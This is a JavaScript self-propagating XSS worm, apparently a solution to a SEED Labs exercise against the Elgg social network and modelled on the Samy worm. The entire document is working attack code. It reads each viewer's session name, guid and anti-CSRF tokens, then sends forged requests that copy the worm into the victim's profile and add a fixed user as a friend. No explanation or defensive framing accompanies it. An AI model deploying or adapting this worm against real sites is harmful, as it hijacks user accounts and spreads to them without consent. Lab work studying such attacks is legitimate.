<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";                                 

  // Put all the pieces together, and apply the URI encoding
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

  // Set the content of the description field and access level.

 //desc    += "&accesslevel[description]=2";                       

  // Get the name, guid, timestamp, and token.
  var name = "&name=" + elgg.session.user.name;
  var guid = "&guid=" + elgg.session.user.guid;
 
  var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
 
  var token = "&__elgg_token="+elgg.security.token.__elgg_token;
   var briefDesc="&briefdescription=Samy is my Hero"+"&accesslevel[briefdescription]=2";
      var desc = "&description=" + wormCode+"&accesslevel[description]=2";

  // Set the URL
  var sendurlGET="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
  var sendurlPOST="http://www.seed-server.com/action/profile/edit";
  var content = name+guid+ ts + token+briefDesc+desc;
  // Construct and send the Ajax request
  if (elgg.session.user.guid != 59){
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurlPOST,true);
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send(content);
    
     Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurlGET,true);
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
}
